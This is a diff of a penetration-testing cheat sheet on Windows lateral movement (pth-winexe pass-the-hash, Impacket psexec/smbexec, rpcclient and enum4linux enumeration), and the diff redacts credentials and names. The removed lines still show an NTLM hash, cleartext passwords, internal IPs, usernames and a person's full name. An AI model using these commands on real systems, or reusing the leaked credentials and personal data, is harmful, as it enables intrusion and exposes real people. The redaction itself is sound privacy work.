@@ -39,7 +39,7 @@ Winexe
  Example with pth:
  ::
 
-  pth-winexe -U ./Administrator%aad3b435b51404eeaad3b435b51404ee:4b579a266f697c2f086d14ab9b208110 //10.145.X.X cmd.exe
+  pth-winexe -U ./Administrator%aad3b435b51404eeaad3b435b51404ee:4b579a266f697c2xxxxxxxxx //10.145.X.X cmd.exe
   pth-winexe -U EXAMPLE/Administrator%example@123 //10.145.X.X cmd.exe
 
 * Windows Binary win-exe
@@ -160,7 +160,8 @@ Impacket psexec/ smbexe/ wmiexec
 
   ::
 
-   ./psexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180
+   ./psexec.py -debug Admini:Password@10.0.X.X
+
    Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies
  
    [*] Trying protocol 445/SMB...
@@ -181,7 +182,7 @@ Impacket psexec/ smbexe/ wmiexec
 
  ::
 
-  ./smbexec.py -debug Administrat0r:Passw0rd\!\!@10.0.5.180
+  ./smbexec.py -debug Admini:Password@10.0.5.180
 
   Impacket v0.9.16-dev - Copyright 2002-2016 Core Security Technologies
 
@@ -199,9 +200,9 @@ Impacket psexec/ smbexe/ wmiexec
 
   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::4546:b672:307:b488%10
-  IPv4 Address. . . . . . . . . . . : 10.0.5.180
+  IPv4 Address. . . . . . . . . . . : 10.0.X.XX
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
-  Default Gateway . . . . . . . . . : 10.0.4.1
+  Default Gateway . . . . . . . . . : 10.0.X.1
 
   Tunnel adapter isatap.{EB92DEE7-521B-4E14-84C2-0E9B9E96563E}:
 
@@ -412,16 +413,11 @@ rpclient
    user:[zentrale] rid:[0x67f]
    user:[dbserver] rid:[0x7d9]
    user:[JVOO] rid:[0x7fa]
-   user:[arupp] rid:[0x832]
    user:[Standard HMC User Te] rid:[0x8a0]
    user:[event] rid:[0x8d5]
-   user:[mrichte] rid:[0x922]
    user:[remote] rid:[0x9ea]
    user:[pda-vis1] rid:[0xb65]
    user:[TestUser] rid:[0xc46]
-   user:[zermatt] rid:[0xf03]
-   user:[northamerica] rid:[0xf05]
-   user:[xxxx-pikett] rid:[0xf90]
    user:[oeinstall] rid:[0x1133]
    user:[repro] rid:[0x13c3]
 
@@ -485,8 +481,8 @@ rpclient
  ::
 
   rpcclient $> queryuser 0x3601
-  User Name   :   mahodel_s
-  Full Name   :   Martin Hodel
+  User Name   :   dummy_s
+  Full Name   :   Dummy User
   Home Drive  :   
   Dir Drive   :   
   Profile Path:   
@@ -566,7 +562,7 @@ Simple wrapper around the tools in the samba package to provide similar function
 
 ::
 
- enum4linux -P -d xxxx.abcxxx.net -u mluesch -p threE333\$\$ 10.0.65.103
+ enum4linux -P -d xxxx.abcxxx.net -u mluxxxx -p threxxxx 10.0.65.103
 
 
 WinRM
@@ -612,7 +608,7 @@ Add/ remove/ a local user
  Retype the password to confirm:
  The command completed successfully.
 
- Add a domain user
+Add a domain user
 
 ::
 
